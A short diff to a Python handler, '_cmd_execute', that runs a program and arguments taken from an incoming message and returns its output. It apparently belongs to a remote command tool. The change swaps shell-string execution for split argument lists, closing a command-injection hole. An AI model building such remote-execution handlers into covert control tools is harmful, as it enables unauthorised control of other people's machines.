@@ -40,15 +40,16 @@ def _cmd_delete(m):
 def _cmd_execute(m):
     try:
         p = m["path"]
-        args = m.get("args", "")
+        arg_str = m.get("args", "")
         wait = m.get("wait", False)
-        cmd = f'"{p}" {args}'.strip()
+        import shlex
+        cmd_parts = [p] + (shlex.split(arg_str) if arg_str else [])
         if wait:
-            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=int(m.get("timeout", 30)))
+            r = subprocess.run(cmd_parts, capture_output=True, timeout=int(m.get("timeout", 30)))
             out = r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
             return {"output": out[:5000] if out else f"[+] Executed (exit={r.returncode})"}
         else:
-            subprocess.Popen(cmd, shell=True, close_fds=True)
+            subprocess.Popen(cmd_parts, close_fds=True)
             return {"output": f"[+] Started: {p}"}
     except subprocess.TimeoutExpired: return {"output": "[!] Execution timed out"}
     except Exception as e: return {"output": f"[!] Execute failed: {e}"}
